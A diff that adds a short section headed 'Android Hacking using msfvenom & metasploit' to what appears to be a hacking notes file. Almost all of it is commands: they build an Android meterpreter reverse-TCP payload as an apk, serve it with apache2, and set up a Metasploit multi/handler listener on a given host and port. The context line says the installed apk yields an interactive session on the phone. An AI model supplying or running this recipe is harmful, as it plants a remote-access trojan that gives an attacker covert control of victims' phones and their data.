@@ -19,3 +19,14 @@ Once you open the installed apk on phone you'll get the interactive session of t
 
 
 
+--Android Hacking using msfvenom & metasploit--
+
+> msfvenom -p android/meterpreter/reverse_tcp LHOST local_machine_ip LPORT 4444 R> test.apk
+> service apache2 start
+open another terminal
+> msfconsole
+> msf6 use multi/handler
+> msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
+> msf6 exploit(multi/handler) > set LHOST 192.168.0.20
+> msf6 exploit(multi/handler) > set LPORT 4444
+> msf6 exploit(multi/handler) > exploit
